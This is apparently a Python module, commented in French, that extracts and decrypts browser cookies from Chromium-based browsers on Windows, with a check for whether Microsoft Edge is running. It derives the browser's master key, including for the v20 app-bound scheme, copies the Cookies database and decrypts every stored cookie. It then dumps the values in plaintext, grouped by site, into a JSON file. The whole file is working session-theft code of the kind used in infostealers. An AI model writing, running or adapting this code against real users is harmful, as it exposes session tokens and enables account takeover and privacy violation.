import json
import os 
import sqlite3
import shutil
from Crypto.Cipher import AES
from datetime import datetime, timedelta
from chromium_windows.master_key import find_master_key
import  psutil 
import sys 
from chromium_windows.v20_key import derive_v20_master_key_from_local_state


def is_edge_running():
    for  proc in psutil.process_iter(['name']):
        if proc.info['name'] and 'msedge.exe' in proc.info['name']:
            return True
    return False

def chromium_time_conversion(chromium_data):
    try:
        return datetime(1601, 1, 1) + timedelta(microseconds=chromium_data)
    except:
        return chromium_data


def decrypt_cookie_v20(encrypted_value, master_key):
    cookie_iv = encrypted_value[3:3+12]
    encrypted_cookie = encrypted_value[3+12:-16]
    cookie_tag = encrypted_value[-16:]
    cookie_cipher = AES.new(master_key, AES.MODE_GCM, cookie_iv)
    decrypted_cookie = cookie_cipher.decrypt_and_verify(encrypted_cookie, cookie_tag)
    return decrypted_cookie[32:].decode('utf-8', errors='ignore')
# def decrypt_value(buff, master_key):

#     print (f'la cle maitre est : {master_key}')
#     print(f'le buff est : {buff}')
#     try:
#         if buff[:3] in (b'v10', b'v20'):
#             iv = buff[3:15]
#             payload = buff[15:]
           
#             cipher = AES.new(master_key, AES.MODE_GCM, iv)
#             return cipher.decrypt(payload)[:-16].decode()
#         else:
#             return buff.decode()
#     except Exception as e:
#         return "Chromium :("

def get_cookies(session_id, browser_name, path_local_state, path_cookies_db):
    # Obtenir la master key pour déchiffrer
   # détecter si on doit utiliser la v20
    try:
        master_key = derive_v20_master_key_from_local_state(path_local_state)
    except Exception as e:
        print(f"[WARN] Echec v20, fallback vers master_key classique : {e}")
        from chromium_windows.master_key import find_master_key
        master_key = find_master_key(file_path=path_local_state)

    # Copier la base de données dans un fichier temporaire
    temp_db = f"chromium_windows/output/db/{browser_name}_{session_id}.db"
    os.makedirs(os.path.dirname(temp_db), exist_ok=True)
    shutil.copy2(path_cookies_db, temp_db)

    grouped_data = {}
    print(f"[INFO] Lecture de la base depuis : {temp_db}")
    with sqlite3.connect(temp_db) as conn:
        cursor = conn.cursor()
        for row in cursor.execute(
            "SELECT host_key, name, encrypted_value, creation_utc, last_access_utc, expires_utc FROM cookies"
        ):
            host_key = row[0]
            data = {
                "key": row[1],
                "value": decrypt_cookie_v20(row[2], master_key),
            }

            if host_key not in grouped_data:
                grouped_data[host_key] = []
            grouped_data[host_key].append(data)

    directory = f"chromium_windows/output/json"
    os.makedirs(directory, exist_ok=True)
    
    json_file_path = os.path.join(directory, f"{browser_name}_{session_id}.json")

    with open(json_file_path, "w") as json_file:
        json.dump(grouped_data, json_file, indent=4)

    return json_file_path





